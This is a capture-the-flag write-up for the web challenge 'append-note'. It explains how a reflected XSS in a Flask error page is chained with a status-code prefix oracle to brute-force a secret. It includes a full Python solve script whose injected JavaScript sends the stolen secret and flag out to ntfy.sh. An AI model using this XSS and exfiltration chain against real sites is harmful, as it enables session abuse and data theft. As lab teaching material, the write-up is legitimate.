# append-note

**Category:** web

---

**Category:** Web | **Points:** 233 | **Solves:** 58

#### Description

Our distributed notes app is append optimized. Reads are eventually consistent with the heat death of the universe! :)

Provided: `app.py` (Flask app), `admin-bot.js` (Puppeteer bot), an instancer giving a challenge URL and an admin-bot URL.

#### Solution

**Source Analysis**

The Flask app generates a random 8-hex-char `SECRET = secrets.token_hex(4)` stored as the first note. Three endpoints matter:

**`/append`** — requires an `admin` cookie. Takes `content` and `url` query params. Validates `url` has scheme `http`/`https` and hostname matching the challenge host. If validation fails, it reflects `parsed_url.hostname` **unescaped** in the error response:

```python
return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400
```

If validation passes, returns **200** if `content` is a prefix of any note, else **404**, and appends `content` to notes.

**`/flag`** — returns the flag if `?secret=` matches `SECRET`. Has `Access-Control-Allow-Origin: *`.

**Admin bot** — sets an `httpOnly`, `SameSite=Lax` cookie for the challenge domain and navigates to our submitted URL, keeping the page open for 60 seconds.

**Vulnerabilities**

1. **Reflected XSS** in `/append` error page: `parsed_url.hostname` is rendered as raw HTML in a `text/html` response (Flask's default Content-Type for string returns). No CSP is set.
2. **Prefix oracle** in `/append`: the 200 vs 404 status code leaks whether `content` is a prefix of any note (including `SECRET`).

**Exploit Chain**

**Step 1: Reflected XSS via `urlparse` hostname injection**

Python's `urlparse` is permissive — for a URL like `http://<img src=x onerror=PAYLOAD>/path`, it extracts `<img src=x onerror=PAYLOAD>` as the hostname. This hostname fails the challenge-host check, so it gets reflected in the 400 error page as live HTML.

The catch: `urlparse.hostname` **lowercases** everything. JavaScript is case-sensitive, so `encodeURIComponent` becomes `encodeuricomponent` and breaks. The bypass: percent-encode every byte of the JS payload (`(` → `%28`, `A` → `%41`, etc.) and wrap it in `eval(unescape('...'))`. Both `eval` and `unescape` are already lowercase, and `unescape` is case-insensitive for hex digits (`%4E` and `%4e` both decode to `N`).

Using `<img onerror>` instead of `<script>` is critical — an unclosed `<script>` tag (no `</script>` since `/` terminates the hostname in URL parsing) does **not** execute in Chrome, but `<img src=x onerror=...>` fires immediately when the image fails to load.

The crafted `url` parameter:

```
http://<img src=x onerror=eval(unescape('PERCENT_ENCODED_JS'))>/x
```

The admin bot navigates to:

```
https://CHALLENGE/append?content=&url=<url-encoded evil URL>
```

Since this is a top-level GET navigation, the `SameSite=Lax` admin cookie is sent. Auth passes, URL validation fails (hostname mismatch), and the XSS fires **same-origin** on the challenge domain.

**Step 2: Same-origin prefix oracle brute-force**

Running same-origin, the JS payload uses `fetch()` (cookies auto-included) to query `/append?content=PREFIX&url=CHALLENGE_ORIGIN/` and reads `response.status` directly — **200** means the prefix matches, **404** means it doesn't.

For each of the 8 hex positions, all 16 candidates (`0`–`f`) are tested in parallel via `Promise.all`. This completes in 8 sequential rounds of 16 parallel requests — well within the bot's 60-second window.

Previously appended probe strings never cause false positives: a probe from round M is M+1 chars long, which is shorter than a round N probe (N+1 chars, N > M), and a shorter string cannot `startswith` a longer one.

**Step 3: Flag retrieval and exfiltration**

Once the SECRET is known, the payload fetches `/flag?secret=SECRET` (which has `ACAO: *`) and exfils both the secret and flag to ntfy.sh via cross-origin `fetch` POST (ntfy.sh returns `Access-Control-Allow-Origin: *`).

**Solve Script**

```python
#!/usr/bin/env python3
"""
Usage: python3 solve_final.py CHALLENGE_URL BOT_URL
Example: python3 solve_final.py https://append-note-xxx.instancer.lac.tf https://admin-bot-xxx.instancer.lac.tf
"""
import sys, time, json, urllib.parse, urllib.request, secrets

def percent_encode_all(s):
    return ''.join(f'%{b:02X}' for b in s.encode())

def make_exploit_url(challenge_url, ntfy_topic):
    JS_PAYLOAD = f'''(async()=>{{
var H=location.origin;
var N="https://ntfy.sh/{ntfy_topic}";
function x(m){{fetch(N,{{method:"POST",body:m}})}}
async function p(pre){{
var r=await fetch(H+"/append?content="+encodeURIComponent(pre)+"&url="+encodeURIComponent(H+"/"));
return r.status===200;
}}
x("started");
if(!(await p(""))){{x("fail-empty");return}}
var sec="";
var hex="0123456789abcdef";
for(var i=0;i<8;i++){{
var res=await Promise.all([...hex].map(async c=>{{var ok=await p(sec+c);return[c,ok]}}));
var hit=res.find(v=>v[1]);
if(!hit){{x("stuck-"+i+"-"+sec);return}}
sec+=hit[0]
}}
x("SECRET="+sec);
try{{var r=await fetch(H+"/flag?secret="+sec);var t=await r.text();x("FLAG="+t)}}catch(e){{x("ERR-"+e)}}
}})()'''

    encoded = percent_encode_all(JS_PAYLOAD)
    evil_url = f"http://<img src=x onerror=eval(unescape('{encoded}'))>/x"
    return f"{challenge_url}/append?content=&url={urllib.parse.quote(evil_url, safe='')}"

def submit_to_bot(bot_url, exploit_url):
    data = urllib.parse.urlencode({'url': exploit_url, 'g-recaptcha-response': ''}).encode()
    req = urllib.request.Request(f"{bot_url}/append-note", data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        resp = urllib.request.urlopen(req)
        return resp.status, resp.url
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get('Location', '')

def poll_ntfy(topic, timeout=90):
    print(f"[*] Polling ntfy.sh/{topic} for up to {timeout}s...")
    start, seen = time.time(), set()
    while time.time() - start < timeout:
        try:
            resp = urllib.request.urlopen(f"https://ntfy.sh/{topic}/json?poll=1", timeout=10)
            for line in resp.read().decode().strip().split('\n'):
                if not line: continue
                msg = json.loads(line)
                if msg['id'] not in seen:
                    seen.add(msg['id'])
                    print(f"[+] {msg['message']}")
                    if 'FLAG=' in msg['message']:
                        return msg['message']
        except Exception:
            pass
        time.sleep(3)

def main():
    challenge_url = sys.argv[1].rstrip('/')
    bot_url = sys.argv[2].rstrip('/')
    ntfy_topic = f"an-{secrets.token_hex(8)}"

    print(f"[*] Challenge: {challenge_url}")
    print(f"[*] Bot: {bot_url}")
    print(f"[*] Ntfy topic: {ntfy_topic}")

    exploit_url = make_exploit_url(challenge_url, ntfy_topic)
    print(f"[*] Exploit URL length: {len(exploit_url)}")

    print("[*] Submitting to admin bot...")
    status, location = submit_to_bot(bot_url, exploit_url)
    print(f"[*] Bot response: {status} -> {location}")

    result = poll_ntfy(ntfy_topic)
    if result and 'SECRET=' in result:
        secret = result.split('SECRET=')[1].strip()
        flag = urllib.request.urlopen(f"{challenge_url}/flag?secret={secret}").read().decode()
        print(f"[+] FLAG: {flag}")
    elif result:
        print(f"[+] {result}")

if __name__ == '__main__':
    main()
```

**Flag**

```
lactf{3V3n7U4LLy_C0N5I573N7_70_L34X}
```
